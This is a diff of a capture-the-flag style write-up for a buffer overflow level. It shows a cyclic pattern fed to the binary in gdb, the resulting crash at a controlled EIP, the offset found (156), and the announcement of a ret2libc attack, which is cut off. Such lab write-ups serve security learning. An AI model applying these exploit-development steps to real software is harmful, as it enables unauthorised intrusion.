@@ -10,16 +10,13 @@ The subtility this time is that a lot of the stuff happens in a child process. L
 Now we'll find the offset of `eip` with our [usual suspect](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
 ```shell
 (gdb) r < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
-Starting program: /home/users/level04/level04 < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
-[New process 31421]
-child is exiting...
-Give me some shellcode, k
-
+Starting program: /home/users/level04/level04 <...
+[...]
 Program received signal SIGSEGV, Segmentation fault.
 [Switching to process 31421]
 0x41326641 in ?? ()
 ```
-Our offset is at 156
+Our offset is 156.
 
 Now let's do a ret2libc attack to be contrarians. [Here's a comprehensive explanation of it I've written](https://gist.github.com/selfsigned/0a836f3d98efc512509cc042b449160a)
 ```shell
